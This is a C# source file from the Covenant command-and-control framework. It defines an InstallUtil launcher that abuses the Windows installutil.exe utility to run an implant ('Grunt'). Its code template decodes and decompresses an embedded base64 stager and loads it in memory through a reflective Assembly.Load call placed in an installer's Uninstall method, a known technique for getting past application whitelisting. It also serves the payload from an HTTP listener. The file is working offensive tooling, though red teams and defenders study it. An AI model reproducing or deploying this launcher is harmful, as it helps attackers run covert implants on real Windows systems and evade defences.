// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using System.Collections.Generic;
using Microsoft.CodeAnalysis;

using Covenant.Core;
using Covenant.Models.Grunts;
using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public class InstallUtilLauncher : DiskLauncher
    {
        public InstallUtilLauncher()
        {
            this.Name = "InstallUtil";
            this.Type = LauncherType.InstallUtil;
            this.Description = "Uses installutil.exe to start a Grunt via Uninstall method.";
            this.OutputKind = OutputKind.WindowsApplication;
            this.CompressStager = true;
        }

        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
            string code = CodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);

            List<Compiler.Reference> references = grunt.DotNetVersion == Common.DotNetVersion.Net35 ? Common.DefaultNet35References : Common.DefaultNet40References;
            references.Add(new Compiler.Reference
            {
                File = grunt.DotNetVersion == Common.DotNetVersion.Net35 ? Common.CovenantAssemblyReferenceNet35Directory + "System.Configuration.Install.dll" :
                                                                                    Common.CovenantAssemblyReferenceNet40Directory + "System.Configuration.Install.dll",
                Framework = grunt.DotNetVersion,
                Enabled = true
            });
            this.DiskCode = Convert.ToBase64String(Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
            {
                Language = template.Language,
                Source = code,
                TargetDotNetVersion = grunt.DotNetVersion,
                OutputKind = OutputKind.DynamicallyLinkedLibrary,
                References = references
            }));

            this.LauncherString = "InstallUtil.exe" + " " + "/U" + " " + template.Name + ".dll";
            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
                Uri hostedLocation = new Uri(httpListener.Urls.First() + hostedFile.Path);
                this.LauncherString = "InstallUtil.exe" + " " + "/U" + " " + hostedFile.Path.Split('/').Last();
                return hostedLocation.ToString();
            }
            else { return ""; }
        }

        private static readonly string CodeTemplate =
@"using System;
class Program
{
    static void Main(string[] args)
    {
    }
}
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        var oms = new System.IO.MemoryStream();
        var ds = new System.IO.Compression.DeflateStream(new System.IO.MemoryStream(System.Convert.FromBase64String(""{{GRUNT_IL_BYTE_STRING}}"")), System.IO.Compression.CompressionMode.Decompress);
        var by = new byte[1024];
        var r = ds.Read(by, 0, 1024);
        while (r > 0)
        {
            oms.Write(by, 0, r);
            r = ds.Read(by, 0, 1024);
        }
        System.Reflection.Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { new string[]{ } });
    }

}";
    }
}
